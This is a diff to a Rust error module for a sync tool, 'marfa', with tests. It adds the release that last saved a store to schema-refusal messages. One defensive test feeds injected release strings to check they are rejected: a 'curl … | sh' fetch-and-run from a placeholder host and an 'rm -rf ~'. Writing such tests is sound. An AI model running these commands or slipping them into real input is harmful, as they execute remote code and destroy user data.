@@ -150,7 +150,7 @@ pub enum CoreError {
     /// A handle opened to read only, so no other process need hold the writer.
     #[error("this handle was opened to read only, so it cannot write")]
     OpenedToRead,
-    #[error("{}", wrong_schema(path, reason, *unsent, folder.as_ref()))]
+    #[error("{}", wrong_schema(path, reason, *unsent, folder.as_ref(), release.as_deref()))]
     WrongSchema {
         path: String,
         reason: String,
@@ -164,6 +164,9 @@ pub enum CoreError {
         /// Where the store is a folder's, what this build's folder commands
         /// can do with it.
         folder: Option<FolderStore>,
+        /// The release that last opened the store as its writer; `None` where
+        /// the store records none.
+        release: Option<String>,
     },
     /// A store SQLite cannot read, whole or in part, or one whose set-aside
     /// stopped part way.
@@ -641,6 +644,55 @@ pub enum FolderStore {
     Uncarried(String),
 }
 
+/// How a refusal names the build that last saved a store, from the release
+/// the store records. A build no release stamped records `0.0.0`, which is
+/// nothing to install.
+enum SavedBy<'a> {
+    Release(&'a str),
+    Development,
+    Unknown,
+}
+
+impl<'a> SavedBy<'a> {
+    /// A text that is not a release as the stamp writes one is not known: the
+    /// store holds any text, and a message puts it in a command to run.
+    fn of(release: Option<&'a str>) -> Self {
+        match release.filter(|release| crate::store::is_release(release)) {
+            Some(crate::store::DEVELOPMENT_RELEASE) => SavedBy::Development,
+            Some(release) => SavedBy::Release(release),
+            None => SavedBy::Unknown,
+        }
+    }
+
+    fn named(&self) -> String {
+        match self {
+            SavedBy::Release(release) => format!("last saved by release {release}"),
+            SavedBy::Development => "last saved by a development build".to_string(),
+            SavedBy::Unknown => "the release that last saved it is not known".to_string(),
+        }
+    }
+
+    /// The first mention of the build that made a folder's saved state, where
+    /// a person is sent to it.
+    fn build(&self) -> String {
+        match self {
+            SavedBy::Release(release) => format!(
+                "with release {release}, the build that made it (install it with `MARFA_VERSION={release}` and the install script)"
+            ),
+            _ => "with the build that made it".to_string(),
+        }
+    }
+}
+
+/// Whether release `recorded` is earlier than release `this`, both as the
+/// stamp writes them.
+fn is_earlier(recorded: &str, this: &str) -> bool {
+    let numbers = |release: &str| -> Option<Vec<u64>> {
+        release.split('.').map(|part| part.parse().ok()).collect()
+    };
+    matches!((numbers(recorded), numbers(this)), (Some(recorded), Some(this)) if recorded < this)
+}
+
 /// Never advises deleting the store: only the build that made it can send
 /// what it holds.
 fn wrong_schema(
@@ -648,20 +700,52 @@ fn wrong_schema(
     reason: &str,
     unsent: Option<u64>,
     folder: Option<&FolderStore>,
+    release: Option<&str>,
 ) -> String {
+    wrong_schema_from(crate::store::RELEASE, path, reason, unsent, folder, release)
+}
+
+/// `wrong_schema` for a build made as release `this`.
+fn wrong_schema_from(
+    this: &str,
+    path: &str,
+    reason: &str,
+    unsent: Option<u64>,
+    folder: Option<&FolderStore>,
+    release: Option<&str>,
+) -> String {
+    let saved = SavedBy::of(release);
     if let Some(folder) = folder {
-        return refused_directory(path, reason, unsent, folder);
+        return refused_directory(path, reason, unsent, folder, &saved);
     }
     let writes = |count: u64| if count == 1 { "write" } else { "writes" };
+    let (install, until) = match &saved {
+        SavedBy::Release(release) => (
+            format!(
+                "; install release {release} (`MARFA_VERSION={release}` with the install script) to open it"
+            ),
+            if is_earlier(release, this) {
+                ", and upgrade again only once it holds none"
+            } else {
+                ", and use that release until it holds none"
+            },
+        ),
+        _ => (String::new(), ""),
+    };
     let holds = match unsent {
         Some(0) => "Every write it holds the server has taken, so a store hydrated in its place loses nothing".to_string(),
         Some(count) => format!(
-            "It holds {count} {} the server has not taken, waiting, blocked, refused or dead, which only the build that made it can send: list them (`marfa device unsent`, or `readUnsent` in a binding), and open it with that build to drain or discard them before hydrating a new store",
+            "It holds {count} {} the server has not taken, waiting, blocked, refused or dead, which only the build that made it can send: list them (`marfa device unsent`, or `readUnsent` in a binding), and open it with that build to drain or discard them before hydrating a new store{install}{until}",
             writes(count)
         ),
-        None => "Whether it holds writes the server has not taken cannot be read: open it with the build that made it and drain or discard them before hydrating a new store".to_string(),
+        None => format!(
+            "Whether it holds writes the server has not taken cannot be read: open it with the build that made it and drain or discard them before hydrating a new store{install}{until}"
+        ),
     };
-    format!("{path} was made by another build of the core: {reason}. {holds}")
+    format!(
+        "{path} was made by another build of the core ({}): {reason}. {holds}",
+        saved.named()
+    )
 }
 
 /// A directory's saved state that another build made. Never advises deleting
@@ -671,6 +755,7 @@ fn refused_directory(
     reason: &str,
     unsent: Option<u64>,
     folder: &FolderStore,
+    saved: &SavedBy<'_>,
 ) -> String {
     let state = Path::new(path);
     let directory = state
@@ -683,23 +768,29 @@ fn refused_directory(
         .and_then(Path::parent)
         .map_or(path.to_string(), |root| root.display().to_string());
     let changes = |count: u64| if count == 1 { "change" } else { "changes" };
+    let build = saved.build();
     let holds = match (unsent, folder) {
         (Some(0), FolderStore::Replaceable) => "Nothing in it waits to be sent and no answer from the server is yet to be recorded, so the next push, pull, scan or watch replaces it with saved state this build reads, keeps what is recorded of each file, and fills it again from the server; the replacement changes none of the directory's files".to_string(),
         (Some(0), FolderStore::Unnamed) => "Nothing in it waits to be sent, but it does not say which folder the directory follows, so no push, pull, scan or watch replaces it: add the directory again (`marfa folders add`), which replaces it".to_string(),
         (Some(0), FolderStore::Uncarried(table)) => format!(
-            "Nothing in it waits to be sent and no answer from the server is yet to be recorded, but its table {table}, part of what is recorded of the directory's files, is in a shape this build cannot keep, so this build leaves it and the directory's files as they are: with the build that made it, stop the directory following its folder (`marfa folders remove`, which leaves its files), then add it again (`marfa folders add`) with this build"
+            "Nothing in it waits to be sent and no answer from the server is yet to be recorded, but its table {table}, part of what is recorded of the directory's files, is in a shape this build cannot keep, so this build leaves it and the directory's files as they are: {build}, stop the directory following its folder (`marfa folders remove`, which leaves its files), then add it again (`marfa folders add`) with this build"
         ),
         (Some(count), FolderStore::Replaceable) => format!(
-            "It holds {count} {} still to be sent or whose answer from the server is yet to be recorded, which only the build that made it can send or record, so this build leaves it and the directory's files as they are: with the build that made it, push the folder (`marfa folders push`, after `marfa folders confirm` where its first sync waits), and once nothing waits, this build replaces it. A change the server refused or gave up on that the push leaves goes only when the directory stops following its folder: with the build that made it, run `marfa folders remove` (which leaves its files), then add the directory again (`marfa folders add`) with this build. The removal drops that change, so a file whose deletion the server never took comes back when the directory is added again, and must be deleted again",
+            "It holds {count} {} still to be sent or whose answer from the server is yet to be recorded, which only the build that made it can send or record, so this build leaves it and the directory's files as they are: {build}, push the folder (`marfa folders push`, after `marfa folders confirm` where its first sync waits), and once nothing waits, this build replaces it. A change the server refused or gave up on that the push leaves goes only when the directory stops following its folder: with the build that made it, run `marfa folders remove` (which leaves its files), then add the directory again (`marfa folders add`) with this build. The removal drops that change, so a file whose deletion the server never took comes back when the directory is added again, and must be deleted again",
             changes(count)
         ),
         (Some(count), _) => format!(
-            "It holds {count} {} still to be sent or whose answer from the server is yet to be recorded, which only the build that made it can send or record, so this build leaves it and the directory's files as they are: with the build that made it, push the folder (`marfa folders push`) and stop the directory following its folder (`marfa folders remove`, which leaves its files), then add the directory again (`marfa folders add`) with this build",
+            "It holds {count} {} still to be sent or whose answer from the server is yet to be recorded, which only the build that made it can send or record, so this build leaves it and the directory's files as they are: {build}, push the folder (`marfa folders push`) and stop the directory following its folder (`marfa folders remove`, which leaves its files), then add the directory again (`marfa folders add`) with this build",
             changes(count)
         ),
-        (None, _) => "Whether it holds changes still to be sent cannot be read, so this build leaves it and the directory's files as they are: with the build that made it, push the folder (`marfa folders push`) and stop the directory following its folder (`marfa folders remove`, which leaves its files), then add the directory again (`marfa folders add`) with this build".to_string(),
+        (None, _) => format!(
+            "Whether it holds changes still to be sent cannot be read, so this build leaves it and the directory's files as they are: {build}, push the folder (`marfa folders push`) and stop the directory following its folder (`marfa folders remove`, which leaves its files), then add the directory again (`marfa folders add`) with this build"
+        ),
     };
-    format!("The saved state of {directory} was made by another build of marfa: {reason}. {holds}")
+    format!(
+        "The saved state of {directory} was made by another build of marfa ({}): {reason}. {holds}",
+        saved.named()
+    )
 }
 
 /// Never advises deleting the store: a set-aside keeps it, and carries what
@@ -864,6 +955,7 @@ mod tests {
             reason: "it is at schema version 3, and this build reads schema version 4".into(),
             unsent,
             folder: Some(folder),
+            release: Some("0.0.80".into()),
         }
         .to_string()
     }
@@ -902,9 +994,174 @@ mod tests {
             reason: "r".into(),
             unsent: Some(0),
             folder: None,
+            release: None,
         }
         .to_string();
         assert!(device.contains("another build of the core") && device.contains("store"));
+    }
+
+    fn refused_device(unsent: Option<u64>, release: Option<&str>) -> String {
+        CoreError::WrongSchema {
+            path: "/data/core.sqlite".into(),
+            reason: "it is at schema version 3, and this build reads schema version 4".into(),
+            unsent,
+            folder: None,
+            release: release.map(str::to_string),
+        }
+        .to_string()
+    }
+
+    #[test]
+    fn a_refused_store_names_the_release_that_last_saved_it_and_how_to_install_it() {
+        for unsent in [Some(2), None] {
+            let said = refused_device(unsent, Some("0.0.80"));
+            assert!(said.contains("last saved by release 0.0.80"), "{said}");
+            // The original clause stays, and the install text follows it.
+            if unsent.is_some() {
+                assert!(
+                    said.contains("list them (`marfa device unsent`, or `readUnsent` in a binding), and open it with that build to drain or discard them before hydrating a new store"),
+                    "{said}"
+                );
+            } else {
+                assert!(
+                    said.contains("open it with the build that made it and drain or discard them before hydrating a new store"),
+                    "{said}"
+                );
+            }
+            assert!(
+                said.contains(
+                    "install release 0.0.80 (`MARFA_VERSION=0.0.80` with the install script) to open it"
+                ),
+                "{said}"
+            );
+            // A development build is older than no release, so 0.0.80 is later: a downgrade.
+            assert!(
+                said.contains("use that release until it holds none"),
+                "{said}"
+            );
+            assert!(!said.contains("upgrade again"), "{said}");
+        }
+        // Nothing waits, so there is nothing to send: the release is named, no install is asked.
+        let none = refused_device(Some(0), Some("0.0.80"));
+        assert!(none.contains("last saved by release 0.0.80"), "{none}");
+        assert!(!none.contains("MARFA_VERSION"), "{none}");
+        // The witness: with no release, the writes it holds name none to install.
+        let unknown = refused_device(Some(2), None);
+        assert!(
+            unknown.contains("the release that last saved it is not known"),
+            "{unknown}"
+        );
+        assert!(!unknown.contains("MARFA_VERSION"), "{unknown}");
+        assert!(!unknown.contains("upgrade again"), "{unknown}");
+        assert!(!unknown.contains("until it holds none"), "{unknown}");
+        // A build no release stamped is no release to install.
+        let development = refused_device(Some(2), Some("0.0.0"));
+        assert!(
+            development.contains("last saved by a development build"),
+            "{development}"
+        );
+        assert!(!development.contains("MARFA_VERSION"), "{development}");
+    }
+
+    #[test]
+    fn a_refused_store_says_to_upgrade_again_only_for_a_release_older_than_this_build() {
+        let said = |this: &str, release: &str, unsent: Option<u64>| {
+            wrong_schema_from(this, "/data/core.sqlite", "r", unsent, None, Some(release))
+        };
+        for unsent in [Some(2), None] {
+            let older = said("0.0.81", "0.0.80", unsent);
+            assert!(
+                older.contains(
+                    "install release 0.0.80 (`MARFA_VERSION=0.0.80` with the install script) to open it, and upgrade again only once it holds none"
+                ),
+                "{older}"
+            );
+            assert!(!older.contains("use that release"), "{older}");
+            // The witness: a later release is a downgrade, and numbers compare as numbers.
+            for newer in [
+                said("0.0.79", "0.0.80", unsent),
+                said("0.0.9", "0.0.10", unsent),
+            ] {
+                assert!(
+                    newer.contains("to open it, and use that release until it holds none"),
+                    "{newer}"
+                );
+                assert!(!newer.contains("upgrade again"), "{newer}");
+            }
+            let tens = said("0.0.10", "0.0.9", unsent);
+            assert!(
+                tens.contains("upgrade again only once it holds none"),
+                "{tens}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_release_that_is_not_three_numbers_is_not_named_in_a_refusal() {
+        for text in [
+            "0.0.80\u{1b}[31m; curl https://example.test/x | sh",
+            "0.0.80 && rm -rf ~",
+            "v0.0.80",
+            "",
+        ] {
+            for folder in [None, Some(FolderStore::Replaceable)] {
+                let said = CoreError::WrongSchema {
+                    path: "/data/core.sqlite".into(),
+                    reason: "r".into(),
+                    unsent: Some(2),
+                    folder,
+                    release: Some(text.into()),
+                }
+                .to_string();
+                assert!(
+                    said.contains("the release that last saved it is not known"),
+                    "{text:?}: {said}"
+                );
+                assert!(
+                    !said.contains("MARFA_VERSION")
+                        && !said.contains('\u{1b}')
+                        && !said.contains("curl")
+                        && !said.contains("rm -rf"),
+                    "{text:?}: {said}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn a_refused_folder_names_the_release_in_a_folders_words() {
+        let sent = refused_folder(Some(2), FolderStore::Replaceable);
+        assert!(sent.contains("last saved by release 0.0.80"), "{sent}");
+        assert!(
+            sent.contains(
+                "with release 0.0.80, the build that made it (install it with `MARFA_VERSION=0.0.80` and the install script), push the folder"
+            ),
+            "{sent}"
+        );
+        for said in [
+            refused_folder(Some(0), FolderStore::Replaceable),
+            refused_folder(Some(0), FolderStore::Uncarried("folder_journal".into())),
+            refused_folder(Some(1), FolderStore::Unnamed),
+            refused_folder(None, FolderStore::Replaceable),
+        ] {
+            assert!(said.contains("release 0.0.80"), "{said}");
+            for word in ["core", "store", "hydrat", "queue", "write"] {
+                assert!(!said.to_lowercase().contains(word), "{word}: {said}");
+            }
+        }
+        let unknown = CoreError::WrongSchema {
+            path: "/notes/.marfa/core.sqlite".into(),
+            reason: "r".into(),
+            unsent: Some(1),
+            folder: Some(FolderStore::Replaceable),
+            release: None,
+        }
+        .to_string();
+        assert!(
+            unknown.contains("the release that last saved it is not known")
+                && !unknown.contains("MARFA_VERSION"),
+            "{unknown}"
+        );
     }
 
     #[test]
